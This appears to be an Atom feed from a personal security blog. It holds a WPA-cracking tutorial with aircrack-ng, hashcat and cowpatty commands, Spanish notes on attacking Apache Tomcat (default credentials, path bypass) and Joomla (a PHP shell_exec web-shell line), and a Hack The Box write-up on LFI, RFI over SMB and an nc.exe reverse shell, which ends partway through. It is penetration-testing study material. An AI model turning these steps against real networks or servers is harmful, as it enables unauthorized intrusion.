@@ -1,0 +1,916 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-17T02:47:04+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">creep33.github.io</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>creep33</name></author><entry><title type="html">WPA cracking with aircrack-ng</title><link href="http://localhost:4000/WPA-Cracking-With-Aircrack/" rel="alternate" type="text/html" title="WPA cracking with aircrack-ng" /><published>2022-05-11T00:00:00+02:00</published><updated>2022-05-11T00:00:00+02:00</updated><id>http://localhost:4000/WPA-Cracking-With-Aircrack</id><content type="html" xml:base="http://localhost:4000/WPA-Cracking-With-Aircrack/">&lt;h1 id=&quot;getting-a-handshake&quot;&gt;Getting a handshake&lt;/h1&gt;
+&lt;h2 id=&quot;set-interface-to-monitor-mode&quot;&gt;Set interface to monitor mode&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airmon-ng check &lt;span class=&quot;nb&quot;&gt;kill
+&lt;/span&gt;airmon-ng start wlan0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;choose-a-target&quot;&gt;Choose a target&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng wlan0mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will choose a target who has &lt;strong&gt;PSK&lt;/strong&gt; auth method, and we will store the &lt;strong&gt;chanel&lt;/strong&gt;, the &lt;strong&gt;bssid&lt;/strong&gt; the &lt;strong&gt;essid&lt;/strong&gt; and a &lt;strong&gt;client bssid&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Example target:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ESSID: wifu&lt;/li&gt;
+  &lt;li&gt;BSSID: 34:08:04:09:3D:38&lt;/li&gt;
+  &lt;li&gt;Channel: 3&lt;/li&gt;
+  &lt;li&gt;Client BSSID: 00:18:4D:1D:A8:1F&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Wireless/Airodump-ng_example.png&quot; alt=&quot;Airodump-ng_example&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;prepare-our-capture-scenario&quot;&gt;Prepare our capture scenario.&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;--essid&lt;/span&gt; wifu &lt;span class=&quot;nt&quot;&gt;--bssid&lt;/span&gt; 34:08:04:09:3D:38 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; wpa wlan0mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will store the capture into “wpa.*” files.&lt;/p&gt;
+
+&lt;h2 id=&quot;deathenticate-a-client&quot;&gt;Deathenticate a client&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aireplay-ng &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 34:08:04:09:3D:38 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 00:18:4D:1D:A8:1F wlan0mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;troubleshooting&quot;&gt;Troubleshooting&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Some wireless drivers ignore directed deauthentication and only respond to broadcast deauthentication. We can run the same aireplay-ng deauthentication command without the -c parameter.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;cracking-hash&quot;&gt;Cracking Hash&lt;/h2&gt;
+&lt;p&gt;Once the client reconnects with the target AP, airodump-ng will be able to capture a handshake.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/Wireless/HandShake.png&quot; alt=&quot;HandShake&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before terminating airodump-ng with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;ctrl&amp;gt;+c&lt;/code&gt;, let’s continue to capture traffic between the client and the AP. This additional data will assist us in confirming the key is correct later on.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/john/password.lst &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; wifu &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 34:08:04:09:3D:38 wpa-01.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;troubleshooting-1&quot;&gt;Troubleshooting&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;If 802.11w is in use, unencrypted deauthentication frames are ignored. The only course of action is to wait for a client to connect.&lt;/li&gt;
+  &lt;li&gt;The device simply didn’t reconnect or was already out of range of the AP.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;verifying-its-validity&quot;&gt;Verifying its validity&lt;/h2&gt;
+&lt;p&gt;Aircrack-ng successfully cracked our easy passphrase. However, we should confirm it is correct. It is possible that we captured a client’s unsuccessful attempt to connect to the network. This is where we make use of the additional traffic we captured between the client and the AP.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airdecap-ng &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 34:08:04:09:3D:38 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; wifu &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 12345678 wpa-01.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Obviously the -p parameter if for the cracked passphrase)&lt;/p&gt;
+
+&lt;p&gt;Our results show airdecap-ng successfully decrypted 37 packets. In some cases, where there is a pause in decryptable traffic, airdecap-ng may indicate “0” even if the passphrase is correct.&lt;/p&gt;
+
+&lt;h3 id=&quot;troubleshooting-2&quot;&gt;Troubleshooting&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Another way we can confirm our passphrase is to use Wireshark and add it to a capture as described in the Wireshark module.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Another option is to capture another handshake with airodump-ng and capture more follow-on traffic. We may be able to just capture traffic between the same client and AP, then combine both capture files if little time has elapsed. Rekeying can happen up to an hour after initial handshake.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;custom-wordlists-to-crack&quot;&gt;Custom wordlists to crack&lt;/h1&gt;
+&lt;h2 id=&quot;search-for-router-default-patterns&quot;&gt;Search for router default patterns&lt;/h2&gt;
+&lt;p&gt;It is rare to know an AP’s model prior to an engagement, but we can determine some information about the device’s manufacturer from its &lt;a href=&quot;https://portal.offensive-security.com/courses/pen-210/books-and-videos/modal/modules/cracking-authentication-hashes/custom-wordlists-with-aircrack-ng/custom-wordlists-with-aircrack-ng#fn3&quot;&gt;IEEE &lt;em&gt;Organizationally Unique Identifier&lt;/em&gt; (OUI)&lt;/a&gt;. To do this, we’ll look in the first three bytes of the BSSID.&lt;/p&gt;
+
+&lt;h2 id=&quot;expand-wordlists&quot;&gt;Expand wordlists&lt;/h2&gt;
+&lt;p&gt;In addition to all of this, there are many tools that can mangle and expand our wordlists. We will focus on three popular ones.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;John the Ripper&lt;/em&gt;, also known as John or abbreviated as JtR&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;Crunch&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;RSMangler&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;While all of these tools will mangle words, Crunch is a bit different because it is mostly used to create wordlists from scratch. The capabilities of these tools also overlap, and two tools often can achieve the same result. It’s likely that the tool we choose will depend on personal preference.&lt;/p&gt;
+
+&lt;h2 id=&quot;pipe-john-rules-to-aircrack-ng&quot;&gt;Pipe John rules to aircrack-ng&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/john/password.lst &lt;span class=&quot;nt&quot;&gt;--rules&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--stdout&lt;/span&gt; | aircrack-ng &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; wifu &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - wpa-02.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;aircrack-ng-with-crunch&quot;&gt;Aircrack-ng with CRUNCH&lt;/h2&gt;
+&lt;h3 id=&quot;crunch-usage&quot;&gt;Crunch usage&lt;/h3&gt;
+&lt;p&gt;Given a pattern and a character set or words, Crunch is able to generate all possible combinations.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 8 9 abc123
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Because it is 58TB long, we short the output just with the characters “abc123”)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 11 11 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; Password%%%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Generate an 11 lenght password + 3 numbers dictionary)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 1 1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; dog &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;house 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Generate an all combinations of theese words wordlist)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 5 5 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; ddd%% &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; dog &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;bird
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Generate an all combinations of theese words wordlist and add 2 numbers)&lt;/p&gt;
+
+&lt;h3 id=&quot;pipe-wordlists-to-aircrack&quot;&gt;Pipe wordlists to aircrack&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crunch 11 11 &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; Password%% | aircrack-ng &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; wifu wpa-02.cap &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;aircrack-ng-with-rsmangler&quot;&gt;Aircrack-ng with RSMangler&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rsmangler &lt;span class=&quot;nt&quot;&gt;--file&lt;/span&gt; wordlist.txt &lt;span class=&quot;nt&quot;&gt;--min&lt;/span&gt; 12 &lt;span class=&quot;nt&quot;&gt;--max&lt;/span&gt; 13 | aircrack-ng &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; wifu wpa-03.cap &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cracking-hash-with-hashcat&quot;&gt;Cracking hash with Hashcat&lt;/h1&gt;
+&lt;p&gt;We need to transform the cap file int o a hccapx.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;hashcat-utils
+cap2hccapx wifu-01.cap output.hccapx
+hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 2500 output.hccapx /usr/share/john/password.lst
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;airolib-ng-rt&quot;&gt;Airolib-ng (RT)&lt;/h1&gt;
+&lt;p&gt;Airolib-ng is a tool designed to store and manage ESSID and password lists, compute their Pairwise Master Keys (PMK), and use them in order to crack WPA and WPA2 PSK passphrases. It uses the lightweight &lt;em&gt;SQLite3&lt;/em&gt; database as its storage mechanism, which is available on most platforms. (Rainbow tables)&lt;/p&gt;
+
+&lt;h2 id=&quot;file-with-the-essid&quot;&gt;File with the ESSID&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;wifu &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; essid.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;importing-essid-into-airolib-ng-db&quot;&gt;Importing ESSID into airolib-ng db&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airolib-ng wifu.sqlite &lt;span class=&quot;nt&quot;&gt;--import&lt;/span&gt; essid essid.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;displaying-stored-info&quot;&gt;Displaying stored info&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airolib-ng wifu.sqlite &lt;span class=&quot;nt&quot;&gt;--stats&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;import-passwords-dict&quot;&gt;Import passwords dict&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airolib-ng wifu.sqlite &lt;span class=&quot;nt&quot;&gt;--import&lt;/span&gt; passwd /usr/share/john/password.lst
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;compute&quot;&gt;Compute&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airolib-ng wifu.sqlite &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;displaying-stored-info-1&quot;&gt;Displaying stored info&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airolib-ng wifu.sqlite &lt;span class=&quot;nt&quot;&gt;--stats&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;cracking-with-a-db-in-aircrack-ng&quot;&gt;Cracking with a DB in aircrack-ng&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aircrack-ng &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; wifu.sqlite wpa1-01.cap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;cowpatty-rt&quot;&gt;coWPAtty (RT)&lt;/h1&gt;
+&lt;h2 id=&quot;generating-the-rainbow-table&quot;&gt;Generating the Rainbow Table&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;genpmk &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /usr/share/john/password.lst &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; wifu &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; wifuhashes 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;(Where wifu is the ESSID, and wifuhashes the outputfile)&lt;/p&gt;
+
+&lt;h2 id=&quot;cracking-with-cowpatty&quot;&gt;Cracking with cowpatty&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cowpatty &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; wpajohn-01.cap &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; wifu &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; wifuhashes
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>creep33</name></author><category term="Wifi" /><category term="CLI" /><category term="Aircrack-ng" /><category term="Wifi Hacking" /><category term="WPA" /><summary type="html">En este post se describe como realizar un ataque a WPA utilizando aircrack-ng desde poner la tarjeta en modo monitor hasta comprobar si la contraseña extraída es válida o es una autenticación errónea del usuario.</summary></entry><entry><title type="html">Apache Tomcat</title><link href="http://localhost:4000/Apache-Tomcat/" rel="alternate" type="text/html" title="Apache Tomcat" /><published>2022-01-07T00:00:00+01:00</published><updated>2022-01-07T00:00:00+01:00</updated><id>http://localhost:4000/Apache-Tomcat</id><content type="html" xml:base="http://localhost:4000/Apache-Tomcat/">&lt;h1 id=&quot;definición&quot;&gt;Definición&lt;/h1&gt;
+&lt;p&gt;Apache Tomcat funciona como un contenedor de servlets desarrollado bajo el proyecto Jakarta en la Apache Software Foundation. Tomcat implementa las especificaciones de los servlets y de JavaServer Pages de Oracle Corporation.&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;
+&lt;h2 id=&quot;web&quot;&gt;Web&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;/manger/html -&amp;gt;  Ruta de administración&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Credenciales por defecto:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;USER: tomcat&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;PASS: tomcat&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;path-vuln&quot;&gt;Path vuln&lt;/h3&gt;
+&lt;p&gt;Si la ruta /manager/html está bloqueada, se puede tratar de acceder a esta mediante:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;/lalala/..;/manager/html&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;O mediante un parámetro:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;/;param=value/manager/html&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;archivos-relevantes&quot;&gt;Archivos Relevantes&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;/usr/share/tomcat*/conf/tomcat-users.xml -&amp;gt; Archivo con credenciales hardcodeadas&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Escrito el 07-01-2022 a las 09:11 pm por creep33.&lt;/p&gt;</content><author><name>creep33</name></author><category term="Concepts" /><category term="CMS" /><summary type="html">Posibles vectores de ataque al enfrentarse a un Apache Tomcat, rutas relevantes y archivos de configuración post-explotación relevantes.</summary></entry><entry><title type="html">Joomla</title><link href="http://localhost:4000/Joomla/" rel="alternate" type="text/html" title="Joomla" /><published>2022-01-07T00:00:00+01:00</published><updated>2022-01-07T00:00:00+01:00</updated><id>http://localhost:4000/Joomla</id><content type="html" xml:base="http://localhost:4000/Joomla/">&lt;h1 id=&quot;definición&quot;&gt;Definición&lt;/h1&gt;
+&lt;p&gt;Joomla! es un sistema de gestión de contenidos que permite desarrollar sitios web dinámicos e interactivos. Permite crear, modificar o eliminar contenido de un sitio web de manera sencilla a través de un “panel de administración”.&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;
+&lt;p&gt;Una vez hemos iniciado con credenciales válidas y con capacidad de editar. Nos dirigimos a: Extensions &amp;gt; Templates &amp;gt; Templates &amp;gt; Protostar Details and Files &amp;gt; index.php.&lt;/p&gt;
+
+&lt;p&gt;Y añadimos la línea:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>creep33</name></author><category term="Concepts" /><category term="CMS" /><summary type="html">Posibles vectores de ataque al enfrentarse a un Joomla, rutas relevantes y archivos de configuración post-explotación relevantes.</summary></entry><entry><title type="html">HTB-Sniper</title><link href="http://localhost:4000/HTB-Sniper/" rel="alternate" type="text/html" title="HTB-Sniper" /><published>2021-12-29T00:00:00+01:00</published><updated>2021-12-29T00:00:00+01:00</updated><id>http://localhost:4000/HTB-Sniper</id><content type="html" xml:base="http://localhost:4000/HTB-Sniper/">&lt;center&gt;&lt;img src=&quot;/assets/images/WriteUps/Sniper.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;IP -&amp;gt; 10.10.10.151&lt;/p&gt;
+
+&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;a href=&quot;/Nmap/&quot;&gt;nmap&lt;/a&gt; y obtenemos los siguientes resultados.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/files/WriteUps/Sniper.txt&quot;&gt;Sniper Nmap Result&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;crackmapexec&quot;&gt;Crackmapexec&lt;/h2&gt;
+&lt;p&gt;Usamos &lt;a href=&quot;/Crackmapexec/&quot;&gt;Crackmapexec&lt;/a&gt; para enumerar información del &lt;a href=&quot;/Active-Directory/&quot;&gt;Active Directory&lt;/a&gt; y añadimos el dominio al /etc/hosts&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;OS: Windows 10
+Dominio: Sniper
+Signing: False
+SMBv1: False&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;smbclient-y-smbhost&quot;&gt;smbclient y smbhost&lt;/h2&gt;
+&lt;p&gt;Listamos servicios mediante un [null session](/SMB/
+Pero necesitamos credenciales.&lt;/p&gt;
+
+&lt;h2 id=&quot;http&quot;&gt;http&lt;/h2&gt;
+&lt;p&gt;En la misma página, encontramos los directorios:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;/blog/index.php -&amp;gt; Podemos utilizar distintos idiomas. -&amp;gt; Cada idioma tiene un archivo asociado. 
+/user/login.php -&amp;gt; Panel de inicio de sesión -&amp;gt; Probamos credenciales por defecto&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Probamos un path traversal, en el parámetro lang.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Tenemos LFI&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Probamos a convertirlo en un remote file inclusion.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Pero no funciona&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Probamos a cargar un archivo smb para tratar de crackear el hash.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Es vulnerable a RFI por &lt;a href=&quot;/SMB/&quot;&gt;SMB&lt;/a&gt;. Pero no vemos ningún hash.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Tenemos que crear un recurso compartido con smbd linux.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;service smbd start
+net usershare add smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Everyone:F'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'guest_ok=y'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Creamos un archivo txt a modo de prueba&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Triggeamos el RFI y funciona.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cargamos una webShell por php&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;webShell&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Nos enviamos una reverse shell cmd con &lt;strong&gt;nc.exe&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;user-pivoting-chris&quot;&gt;User Pivoting (Chris)&lt;/h1&gt;
+
+&lt;h2 id=&quot;os&quot;&gt;OS&lt;/h2&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/priv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
